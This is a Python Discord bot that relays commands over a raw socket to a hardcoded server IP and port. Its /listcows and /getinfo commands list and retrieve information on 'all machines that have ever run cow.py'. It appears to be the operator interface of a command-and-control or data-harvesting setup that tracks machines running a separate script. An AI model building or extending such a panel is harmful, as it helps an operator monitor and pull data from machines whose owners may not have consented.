import discord
from discord.ext import commands
from discord import app_commands
import logging
from dotenv import load_dotenv
import os
import socket

def connect(command):
    ip = '54.79.26.131'  # your EC2 IP
    port = 4570
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((ip, port))
    server.send(command.encode())

    try:
        response = server.recv(8192).decode()
    except:
        response = "No response"
    server.close()
    return response

load_dotenv()
token = os.getenv('DISCORD_TOKEN')

handler = logging.FileHandler(filename='discord.log', encoding='utf-8', mode='w')
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f"{bot.user.name} is ready!")
    await bot.tree.sync()   

@bot.tree.command(name="getinfo", description="Get info of cows")
@app_commands.describe(machine_number="Index of the machine from /listcows (starts at 1)")
async def getInfo(interaction: discord.Interaction, machine_number: int):
    await interaction.response.send_message("Grabbing info...", ephemeral=True)

    # Get all machine info blocks
    info_raw = connect(":GETINFO")

    # Each machine block starts with [
    machine_blocks = [block.strip() for block in info_raw.strip().split("[") if block]

    if machine_number < 1 or machine_number > len(machine_blocks):
        await interaction.followup.send("❌ Invalid machine number. Use `/listcows` to see valid options.")
        return

    selected_block = machine_blocks[machine_number - 1]
    final_display = "[" + selected_block  # re-add removed `[` for formatting

    await interaction.followup.send(f"```{final_display}```")

@bot.tree.command(name="listcows", description="List all machines that have ever run cow.py")
async def listCows(interaction: discord.Interaction):
    await interaction.response.send_message("Listing all cows ever seen...")
    machines = connect(":LISTCOWS")
    await interaction.followup.send(f"```{machines}```")

bot.run(token, log_handler=handler, log_level=logging.DEBUG)
